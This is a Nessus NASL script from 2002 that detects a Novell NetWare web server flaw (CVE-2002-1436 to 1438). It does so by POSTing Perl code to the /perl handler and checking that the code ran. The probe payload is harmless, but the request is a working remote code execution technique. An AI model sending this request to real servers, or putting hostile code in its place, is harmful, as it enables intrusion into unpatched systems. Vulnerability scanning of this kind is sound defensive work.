# (c) 2002 visigoth <visigoth@securitycentric.com>
# GPLv2


#
#
# REGISTER
#
if(description)
{
 script_id(11158);
 script_bugtraq_id(5520, 5521, 5522);
 script_version ("$Revision: 1.9 $");
 script_cve_id("CVE-2002-1436", "CVE-2002-1437", "CVE-2002-1438"); 
 
 name["english"] = "Novell NetWare HTTP POST Perl Code Execution Vulnerability";
 script_name(english:name["english"]);
 
 desc["english"] = "
Novell Netware contains multiple default web server installations.  
The Netware Enterprise Web Server (Netscape/IPlanet) has a perl 
handler which will run arbitrary code given to in a POST request 
version 5.x (through SP4) and 6.x (through SP1) are effected.

Risk factor : High

Solution : Install 5.x SP5 or 6.0 SP2

Additionally, the enterprise manager web interface may be used to
unmap the /perl handler entirely.  If it is not being used, minimizing
this service would be appropriate.";

 script_description(english:desc["english"]);
 
 summary["english"] = "Webserver perl handler executes arbitrary POSTs";
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2002 visigoth");

 family["english"] = "Netware";
 script_family(english:family["english"], francais:family["francais"]);

 script_dependencie("http_version.nasl");
 script_require_ports("Services/www",80,2200);
 exit(0);
}

#
# ATTACK
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);


if (! get_port_state(port)) port = 2200;
if (! get_port_state(port)) exit(0);


http_POST = string("POST /perl/ HTTP/1.1\r\n",
	 	   "Content-Type: application/octet-stream\r\n",
		   "Host: ", get_host_name(), "\r\n",
		   "Content-Length: ");

perl_code = 'print("Content-Type: text/plain\\r\\n\\r\\n", "Nessus=", 42+42);';

length = strlen(perl_code);
data = string(http_POST, length ,"\r\n\r\n",  perl_code);
rcv = http_keepalive_send_recv(port:port, data:data);
if(!rcv) exit(0);

if("Nessus=84" >< rcv)
{
	security_hole(port);
}
